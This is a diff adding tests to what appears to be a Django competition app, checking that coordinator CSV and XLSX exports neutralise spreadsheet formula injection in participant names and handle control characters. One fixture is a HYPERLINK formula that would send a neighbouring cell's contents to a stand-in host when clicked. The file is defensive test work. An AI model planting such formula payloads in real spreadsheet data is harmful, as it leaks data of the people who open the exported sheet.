@@ -128,3 +128,45 @@ def test_export_is_forbidden_for_a_participant(web_client, participant, elim_sta
     web_client.force_login(participant.user)
 
     assert web_client.get("/coordinator/export/participants/csv/").status_code == 403
+
+
+FORMULA_NAME = '=HYPERLINK("https://example.test/?d="&D2,"Kliknij")'
+
+
+def test_a_name_that_looks_like_a_formula_is_exported_as_text(web_client, coordinator, entry):
+    """Imię i nazwisko są wolnym tekstem od uczestnika, a arkusz otwiera koordynator."""
+    from openpyxl import load_workbook
+
+    user = entry.participant.user
+    user.first_name, user.last_name = "@SUM(1+1)", FORMULA_NAME
+    user.save(update_fields=["first_name", "last_name"])
+    web_client.force_login(coordinator)
+
+    rows = _csv_rows(web_client.get("/coordinator/export/participants/csv/"))
+    sheet = load_workbook(io.BytesIO(web_client.get("/coordinator/export/participants/xlsx/").content)).active
+
+    assert "'" + FORMULA_NAME in rows[1]
+    assert "'@SUM(1+1)" in rows[1]
+    cells = [cell for row in sheet.iter_rows(min_row=2) for cell in row]
+    assert all(cell.data_type != "f" for cell in cells)
+    assert "'" + FORMULA_NAME in [cell.value for cell in cells]
+
+
+def test_a_control_character_in_a_name_does_not_break_the_spreadsheet(web_client, coordinator, entry):
+    user = entry.participant.user
+    user.last_name = "Kowal\x0bski"
+    user.save(update_fields=["last_name"])
+    web_client.force_login(coordinator)
+
+    response = web_client.get("/coordinator/export/participants/xlsx/")
+
+    assert response.status_code == 200
+    assert response.content[:2] == b"PK"
+
+
+def test_a_phone_number_keeps_its_plus_sign():
+    from apps.core.exports import _cell
+
+    assert _cell("+48 600 100 200") == "+48 600 100 200"
+    assert _cell("-") == "-"
+    assert _cell("\t=1+1") == "'=1+1"
